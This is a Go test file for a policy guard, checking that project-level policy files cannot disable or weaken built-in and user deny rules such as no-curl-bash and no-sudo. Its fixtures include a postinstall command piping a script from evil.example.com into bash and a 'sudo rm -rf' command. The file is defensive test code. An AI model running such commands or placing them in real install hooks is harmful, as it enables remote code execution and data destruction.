package guard_test

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	charmlog "charm.land/log/v2"

	"hop.top/gym/internal/guard"
)

const (
	userDenyRule = "name: user-rule\nwhen: payload.marker == \"bad\"\neffect: deny\nmessage: user rule\n"
	// redefinitions that would turn a deny into nothing.
	curlBashNeutered = "name: no-curl-bash\nwhen: \"false\"\neffect: deny\n"
	userRuleNeutered = "name: user-rule\nwhen: \"false\"\neffect: deny\n"
	userRuleWarn     = "name: user-rule\nwhen: payload.marker == \"bad\"\neffect: warn\n"
)

type files map[string]string

func writeDir(t *testing.T, f files) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range f {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// evalWith loads builtins + the given dirs and evaluates the payload.
// Returns verdict, sorted "rule:severity" findings, and captured logs.
func evalWith(t *testing.T, user, project files, payload map[string]any) (guard.Verdict, string, string) {
	t.Helper()
	var logs bytes.Buffer
	opts := guard.LoadOptions{Logger: charmlog.New(&logs)}
	if user != nil {
		opts.UserDir = writeDir(t, user)
	}
	if project != nil {
		opts.ProjectDir = writeDir(t, project)
	}
	ps, err := guard.Load(opts)
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	eng, err := guard.NewEngine(ps)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	v, fs := eng.Evaluate(map[string]any{"payload": payload})
	var parts []string
	for _, f := range fs {
		parts = append(parts, f.Rule+":"+f.Severity)
	}
	return v, strings.Join(parts, ","), logs.String()
}

var (
	curlPayload = map[string]any{
		"postinstall": "curl https://evil.example.com/i.sh | bash",
	}
	sudoPayload = map[string]any{
		"postinstall": "sudo rm -rf /opt/x",
	}
	userPayload = map[string]any{"marker": "bad"}
)

// Weakening forms from the project dir change nothing (verdict and
// findings match the no-project baseline) and warn once per entry.
// The same forms from the user dir are honoured.
func TestLoad_ProjectCannotWeaken(t *testing.T) {
	cases := []struct {
		name     string
		user     files
		project  files
		payload  map[string]any
		warnings int
	}{
		{"disable builtin", nil, files{"policies.yaml": "disable: [no-curl-bash]\n"}, curlPayload, 1},
		{"relax builtin", nil, files{"policies.yaml": "relax: [no-sudo]\n"}, sudoPayload, 1},
		{"redefine builtin by name", nil, files{"x.yaml": curlBashNeutered}, curlPayload, 1},
		{"redefine builtin by filename", nil, files{"no-curl-bash.yaml": "when: \"false\"\n"}, curlPayload, 1},
		{"disable user policy", files{"u.yaml": userDenyRule}, files{"policies.yaml": "disable: [user-rule]\n"}, userPayload, 1},
		{"relax user policy", files{"u.yaml": userDenyRule}, files{"policies.yaml": "relax: [user-rule]\n"}, userPayload, 1},
		{"redefine user policy", files{"u.yaml": userDenyRule}, files{"x.yaml": userRuleNeutered}, userPayload, 1},
		{"redefine user policy to warn", files{"u.yaml": userDenyRule}, files{"x.yaml": userRuleWarn}, userPayload, 1},
		{"several entries", nil, files{"policies.yaml": "disable: [no-curl-bash, no-sudo]\nrelax: [no-secret-leak]\n"}, curlPayload, 3},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wantV, wantF, _ := evalWith(t, tc.user, nil, tc.payload)
			if wantV != guard.VerdictDeny {
				t.Fatalf("baseline verdict = %q; test payload must be denied", wantV)
			}
			gotV, gotF, logs := evalWith(t, tc.user, tc.project, tc.payload)
			if gotV != wantV || gotF != wantF {
				t.Errorf("project weakened verdict: got %q [%s]; want %q [%s]", gotV, gotF, wantV, wantF)
			}
			if n := strings.Count(logs, "ignoring project"); n != tc.warnings {
				t.Errorf("warnings = %d; want %d\n%s", n, tc.warnings, logs)
			}
		})
	}
}

func TestLoad_WarningNamesFileAndEntry(t *testing.T) {
	_, _, logs := evalWith(t, nil, files{
		"policies.yaml": "disable: [no-curl-bash]\n",
		"evil.yaml":     curlBashNeutered,
	}, curlPayload)
	for _, want := range []string{"policies.yaml", "evil.yaml", "no-curl-bash"} {
		if !strings.Contains(logs, want) {
			t.Errorf("log missing %q:\n%s", want, logs)
		}
	}
}

func TestLoad_UserCanStillOverride(t *testing.T) {
	cases := []struct {
		name string
		user files
		pay  map[string]any
	}{
		{"disable builtin", files{"policies.yaml": "disable: [no-curl-bash]\n"}, curlPayload},
		{"redefine builtin", files{"x.yaml": curlBashNeutered}, curlPayload},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			v, f, logs := evalWith(t, tc.user, nil, tc.pay)
			// Other built-ins (the postinstall script itself) may still
			// deny; the override is honoured when its rule is gone.
			if strings.Contains(f, "no-curl-bash") {
				t.Errorf("user override not honoured: %q [%s]", v, f)
			}
			if logs != "" {
				t.Errorf("unexpected warnings: %s", logs)
			}
		})
	}
	t.Run("relax builtin", func(t *testing.T) {
		v, f, _ := evalWith(t, files{"policies.yaml": "relax: [no-sudo]\n"}, nil, sudoPayload)
		if !strings.Contains(f, "no-sudo:warn") || strings.Contains(f, "no-sudo:deny") {
			t.Errorf("relax not honoured: %q [%s]", v, f)
		}
	})
	t.Run("user disables its own policy", func(t *testing.T) {
		v, _, _ := evalWith(t, files{"u.yaml": userDenyRule, "policies.yaml": "disable: [user-rule]\n"}, nil, userPayload)
		if v == guard.VerdictDeny {
			t.Errorf("verdict = %q", v)
		}
	})
}

func TestLoad_ProjectCanAddAndSelfManage(t *testing.T) {
	add := "name: proj-rule\nwhen: payload.marker == \"bad\"\neffect: deny\n"
	t.Run("new deny policy enforced", func(t *testing.T) {
		v, f, logs := evalWith(t, nil, files{"p.yaml": add}, userPayload)
		if v != guard.VerdictDeny || !strings.Contains(f, "proj-rule:deny") {
			t.Errorf("got %q [%s]", v, f)
		}
		if logs != "" {
			t.Errorf("unexpected warnings: %s", logs)
		}
	})
	t.Run("project disables its own policy", func(t *testing.T) {
		v, f, logs := evalWith(t, nil, files{"p.yaml": add, "policies.yaml": "disable: [proj-rule]\n"}, userPayload)
		if v == guard.VerdictDeny || strings.Contains(f, "proj-rule") {
			t.Errorf("got %q [%s]", v, f)
		}
		if logs != "" {
			t.Errorf("unexpected warnings: %s", logs)
		}
	})
	t.Run("project relaxes its own policy", func(t *testing.T) {
		v, f, _ := evalWith(t, nil, files{"p.yaml": add, "policies.yaml": "relax: [proj-rule]\n"}, userPayload)
		if v != guard.VerdictWarn || !strings.Contains(f, "proj-rule:warn") {
			t.Errorf("got %q [%s]", v, f)
		}
	})
}

// No override form can raise an existing policy's effect: relax only
// lowers, and redefinition by name is ignored from the project dir, so
// there is no project-side "tighten" form to test.
